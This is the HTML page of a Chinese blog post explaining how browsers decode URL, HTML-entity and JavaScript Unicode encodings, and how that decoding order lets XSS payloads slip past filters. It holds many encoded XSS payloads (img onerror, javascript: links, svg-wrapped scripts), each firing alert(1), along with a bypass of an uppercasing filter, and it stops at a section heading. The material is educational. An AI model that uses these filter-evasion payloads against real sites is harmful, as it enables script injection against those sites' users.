<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <title>
        XSS编码剖析 |
        
        A.M.|P.M.
    </title>
    <link rel="shortcut icon" href="/images/logo.svg">
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
  </script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
<div class="page-container">

    

    <header class="page-header">
        <div class="header-progress"></div>
    </header>

    <main class="page-main">

        <div class="page-main-content">

            <div class="page-main-content-top">
                <header class="header-wrapper">

    <div class="header-content">
        <a class="logo-title" href="/">
            A.M.|P.M.
        </a>

        <ul class="menu-list">
            
                <li class="menu-item">
                    <a class=""
                       href="/"
                    >
                        HOME
                    </a>
                </li>
            
                <li class="menu-item">
                    <a class=""
                       href="/archives"
                    >
                        ARCHIVES
                    </a>
                </li>
            
                <li class="menu-item">
                    <a class=""
                       href="/categories"
                    >
                        CATEGORIES
                    </a>
                </li>
            
        </ul>

        <div class="menu-bar">
            <div class="menu-bar-middle"></div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">HOME</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">ARCHIVES</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">CATEGORIES</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


            </div>

            <div class="page-main-content-middle">

                <main class="main-content normal-code-theme">

                    
                        <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">XSS编码剖析</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.png">
                </div>
                <div class="info">
                    <div class="author">
                        <span>John_Frod</span>
                        <span class="level">Lv4</span>
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-calendar"></i> 2021-03-13 10:52:40
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>
            <ul>
                
                    <li>
                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>
            <ul>
                
                    <li>
                        <a href="/tags/XSS/">XSS</a>
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <h2 id="XSS编码剖析"><a href="#XSS编码剖析" class="headerlink" title="XSS编码剖析"></a>XSS编码剖析</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在不了解HTML、JavaScript在网页中编码解码的原理之前，我就有一个疑惑，为什么有时候一些关键字被过滤掉了之后可以使用编码进行绕过，编码之后的内容仍然可以在页面中解析出来；可是反过来后端防御攻击的手段又是将输入的内容进行编码转义，如PHP中的<code>htmlspecialchars()</code>函数，使得其中的内容变为一般的字符输出，而不会在页面中解析出来。这两者有关联吗，其中的原因又是什么？</p>
<h2 id="浏览器响应过程"><a href="#浏览器响应过程" class="headerlink" title="浏览器响应过程"></a>浏览器响应过程</h2><p>来看看浏览器处理一次完整的HTTP请求，会涉及到的编码解码问题。</p>
<ol>
<li>当浏览器发送HTTP请求时，会先对特殊字符进行URL编码后，发送给服务器。</li>
<li>服务器收到客户端发送来的HTTP请求，会对其进行URL解码后，再进行处理，处理完成后将结果返回给浏览器。</li>
<li>浏览器接收到HTML文件后，最先是触发HTML解析器来解析HTML，将标签转化为内容树中的DOM节点，此时在识别标签的时候，HTML解析器是不能识别哪些被HTML实体编码了，只有当整个DOM树建立起来后，才能对每个节点的内容进行识别，如果有HTML实体编码，再对其进行解码。</li>
<li>在HTML解析器过程中，遇到JS标签诸如<code>&lt;script&gt;</code>会调用JS解释器对JS代码进行解析，而JS DOM API会对DOM结构进行更改，DOM树节点的更改也会反过来触发HTML解释器。</li>
<li>CSS解释器也会在HTML解释器过程中参与进来，但它不会干扰到DOM树，它会结合<code>&lt;style&gt;</code>标签和CSS文件以及HTML指令来构建render tree。</li>
</ol>
<h2 id="常用编码"><a href="#常用编码" class="headerlink" title="常用编码"></a>常用编码</h2><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p>
<p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p>
<p>这里值得一提的是，URL编码作用并不在于绕过后台检测，但是当我们是以GET方式提交数据时，如果数据中存在<code>&amp;</code>、<code>#</code>、<code>+</code>这样的特殊字符，就需要进行URL编码，才能够保障正常解析，因为这些字符在URL中都有特殊的功能，不进行编码就会默认为是特殊的功能。</p>
<p>example：</p>
<p>服务器后端对<code>and</code>这个关键字进行了拦截，这时候我们想使用<code>&amp;&amp;</code>来代替，如果我们在URL中输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 &amp;&amp; 1&#x3D;2</span><br></pre></td></tr></table></figure>
<p>这时候后端收到的并不是<code>id=1 &amp;&amp; 1=2</code>，而是<code>id=1</code>和<code>1=2</code>，这是由于<code>&amp;</code>的存在导致后端认为我们输入的2个参数而不是一个，正确的输入为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 %26%26 1&#x3D;2</span><br></pre></td></tr></table></figure>
<p>通过URL编码让后端认为我们输入的<code>&amp;</code>并不是想要输入多个参数，而是原来就是<code>&amp;</code>的字符，就好像是我们在字符串中想要输出<code>\</code>的时候，我们要使用<code>\\</code>进行转义一样。</p>
<h3 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h3><p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p>
<p>但是在HTML中有些字符是和关键词冲突的，比如<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是标签，怎么解决呢？</p>
<p>为了正确地显示预留字符，我们需要在HTML源代码中使用字符实体，比如我们常见的空格<code>&amp;nbsp;</code>，字符实体以&amp;开头+预先定义的实体名称表示，但不是所有的字符都有实体名称，但是它们都有实体编号，也可以用&amp;#开头+实体编号+分号表示。比如：</p>
<table>
<thead>
<tr>
<th>显示结果</th>
<th>描述</th>
<th>实体名称</th>
<th>实体编号</th>
</tr>
</thead>
<tbody><tr>
<td>&lt;</td>
<td>小于号</td>
<td><code>&amp;lt;</code></td>
<td><code>&amp;#60;</code></td>
</tr>
<tr>
<td>&gt;</td>
<td>大于号</td>
<td><code>&amp;gt;</code></td>
<td><code>&amp;#62;</code></td>
</tr>
</tbody></table>
<p><strong>浏览器对HTML解码之后就开始解析HTML，将标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析</strong>。</p>
<p>所以在PHP中，使用<code>htmlspecialchars()</code>函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。因此，具体来说，我们对HTML标签的结构进行实体编码就会导致他在浏览器解析的时候无法认为这是一个标签，而是一个串，但是当标签建立之后，里面的内容是能够被HTML解析出来的。</p>
<p>example：</p>
<ul>
<li>这是无法被解析出来，因为编码破坏了标签本身的结构</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>&amp;#<span class="attr">x3d</span>;&quot;<span class="attr">http:</span>//<span class="attr">www.example.com</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">s</span>&amp;#<span class="attr">x72</span>;<span class="attr">c</span>=<span class="string">&quot;http://www.example.com&quot;</span>&gt;</span></span><br><span class="line">&lt;s<span class="symbol">&amp;#x63;</span>ript&gt;alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这是能够被解析出来，因为结构没有被破坏，里面的内容可以被解析</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;ht<span class="symbol">&amp;#x74;</span>p://www.example.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">aler&amp;#x74;(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="JavaScript解码（Unicode）"><a href="#JavaScript解码（Unicode）" class="headerlink" title="JavaScript解码（Unicode）"></a>JavaScript解码（Unicode）</h3><p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如<code>&lt;script&gt; &lt;style&gt;</code>这样的标签，解析器会自动切换到JS解析模式，而<code>src</code>、 <code>href </code>后边加入的JavaScript伪URL，也会进入JS 的解析模式。而进入该解析模式的时候，该DOM节点已经建立起来了，但是HTML解释器还并未进行HTML解码。当触发JS解释器后，JS会先对内容进行解析，如果有JS编码就会进行解码操作，接下来是就是执行里面的JS语句。所以此时执行该JS语言前的解码顺序为JS解码–&gt;HTML解码。</p>
<p>在一个页面中，可以出发JS 解析器的方式有这么几种：</p>
<ul>
<li>直接嵌入<code>&lt;script&gt;</code> 代码块。</li>
<li>通过<code>&lt;script src=… &gt;</code> 加载代码。</li>
<li>各种HTML CSS 参数支持JavaScript：URL 触发调用。</li>
<li>CSS expression(…) 语法和某些浏览器的XBL 绑定。</li>
<li>事件处理器(Event handlers),比如 onload, onerror, onclick等等。</li>
<li>定时器，Timer(setTimeout, setInterval)</li>
<li>eval(…) 调用。</li>
</ul>
<p>example：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;&lt;\u4e00&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的<code>herf</code>的URL经过URL解码之后发现，使用了JavaScript伪协议，所以JS会对内容进行解析，里边有一个转义字符<code>\u4e00</code>，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为<code>一</code>，于是在完成JS的解析之后变成了：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;&lt;一&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>仍以上一段代码为例，假如我们编码的位置不是括号里，而是在alert上，JS是会对它进行解码的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061lert(&#x27;&lt;一&gt;&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>但是，不能对协议类型进行任何编码，因为这样会导致URL认不出来是JavaScript伪协议，从而不会进行JS解析！！</strong></p>
<p>而另一方面，如果想用这种方式来替换掉圆括号，或者引号，会判定为失败，因为对于JavaScript，转义编码应当只出现在标示符部分，不能用于对语法有真正影响的符号，也就是括号，或者是引号。同时，<strong>上边这种直接在字符串外进行编码的方式，只有 Unicode 编码方式被支持，其他编码方式则不行</strong>。</p>
<h2 id="XSS编码实践"><a href="#XSS编码实践" class="headerlink" title="XSS编码实践"></a>XSS编码实践</h2><p>我们从几个简单的例子回顾加深一下浏览器解析代码的过程：</p>
<h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>当服务器返回一个如上的代码时，首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;a&gt;</code>标签语法，于是就先建立了一个DOM节点；然后对<code>href</code>里面的内容进行HTML解码；由于<code>href</code>属性的值是URL，因此会对<code>herf</code>属性的值进行URL解码；接着由于URL的协议类型是JavaScript伪协议，然后就会进行JS解码，最后执行语句。</p>
<p>整个解析顺序为3个环节：HTML解码 –&gt;URL解码 –&gt;JS解码</p>
<p>我们可以对其做以下变形，下列情况都可以成功弹框：</p>
<ul>
<li>将<code>javascript:alert(&#39;xss&#39;)</code>转化为HTML实体，因为解析HTML之后，建立起<code>&lt;a&gt;</code>DOM节点，然后对DOM节点里面的HTML实体进行解析。</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span>&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：这里还要多一个步骤进行URL编码，因为里面的<code>&amp;</code>和<code>#</code>都有特殊功能</strong></p>
<p>因此真正提交的URL应该是这样的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对<code>alert(1);</code>进行URL编码，因为在HTML解析之后会对<code>href</code>的值进行URL解码，不过实际上这里没有需要URL转义的内容，因此还是一样</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对<code>alert</code>做JS编码，因为在URL解码之后，发现URL资源类型为JavaScript，因此会调用JS解析器来对JS代码进行解析</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>混合编码</li>
</ul>
<p>由于浏览器解码的过程是：HTML解码 –&gt;URL解码 –&gt;JS解码</p>
<p>因此我们可以反过来编码：JS解码 –&gt;URL解码 –&gt;HTML解码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码（Unicode）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">3. 对href标签中的除了协议名字(javascript:)以外的部分进行URL编码</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074(1)&quot;</span>&gt;</span></span><br><span class="line">4. 对href的值进行HTML编码（再加上要URL编码）</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x25%3B%26%23x35%3B%26%23x43%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个例子和案例一类似，只不过由于<code>onerror</code>是事件，本来就属于JS操作，因此只是比案例一少了个URL解码，下列情况都可以成功弹框：</p>
<ul>
<li>对<code>alert(1)</code>进行HTML编码(再加上URL编码)</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>对<code>alert</code>进行JS编码（Unicode）</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>混合编码，先进行JS编码然后再HTML编码(再加上URL编码)</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码（Unicode）</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;</span>&gt;</span></span><br><span class="line">3. 对onerror的值进行HTML编码（再加上URL编码）</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h3 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个例子就比较特别了，当服务器返回一个如上的代码时，首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;script&gt;</code>标签，于是就先建立了一个DOM节点；由于是<code>&lt;script&gt;</code>标签，所以这里并不会第一时间进行HTML解码，而是先进行JS解码，JS解码之后若有必要才进行HTML解码，（这里没有必要，因为没有检查到完整得HTML标签结构），最后执行语句。</p>
<p>我们可以对其做以下变形，下列情况都可以成功弹框：</p>
<ul>
<li>对<code>alert</code>进行JS编码</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用<code>&lt;svg&gt;</code>标签放在<code>&lt;script&gt;</code>标签前面，那么就可以对<code>&lt;script&gt;</code>标签里面的内容进行Html编码，这是因为在解析到<code>&lt;svg&gt;</code>标签时，浏览器就开始使用一套新的标准开始解析后面的内容，直到碰到闭合标签<code>&lt;/svg&gt;</code>。而在这一套新的标准遵循XML解析规则，在XML中实体编码会自动转义，重新来一遍标签开启状态，此时就会执行xss了。（当然了如果你要使用GET方法传参的话最后还要加上URL编码）</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>混合编码，先进行JS编码，再利用<code>&lt;svg&gt;</code>标签进行HTML编码</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 源代码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2. 对alert进行JS编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>\u0061\u006c\u0065\u0072\u0074(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">3. 利用 svg 标签进行HTML编码</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x31%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x63%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x36%3B%26%23x35%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x32%3B%26%23x5c%3B%26%23x75%3B%26%23x30%3B%26%23x30%3B%26%23x37%3B%26%23x34%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="XSS编码绕过原理"><a href="#XSS编码绕过原理" class="headerlink" title="XSS编码绕过原理"></a>XSS编码绕过原理</h2><p>看完上面的实践内容，估计都清楚浏览器解析代码的过程了吧，这里看2个XSS编码绕过的案例。</p>
<h3 id="利用HTML编码绕过"><a href="#利用HTML编码绕过" class="headerlink" title="利用HTML编码绕过"></a>利用HTML编码绕过</h3><ul>
<li>服务器后端关键代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>)</span>&#123;</span><br><span class="line">    input = input.toUpperCase()</span><br><span class="line">    <span class="keyword">return</span> `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里后端把输入的参数进行了大写处理，由于JavaScript代码对大小写敏感，也就是说<code>ALERT()</code>是不能触发弹窗的，这里就是利用HTML对大小也不敏感，所以HTML编码绕过</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>浏览器解析过程：首先是HTML解析器开始工作，检查语句是结构完整的<code>&lt;img&gt;</code>标签语法，于是就先建立了一个DOM节点；然后去<code>onerror</code>事件的值进行HTML解码；接着交给JS解析器进行JS解码，最后执行语句。</p>
<h3 id="利用JS编码绕过"><a href="#利用JS编码绕过" class="headerlink" title="利用JS编码绕过"></a>利用JS编码绕过</h3><ul>
<li>服务器后端关键代码</li>
</ul>
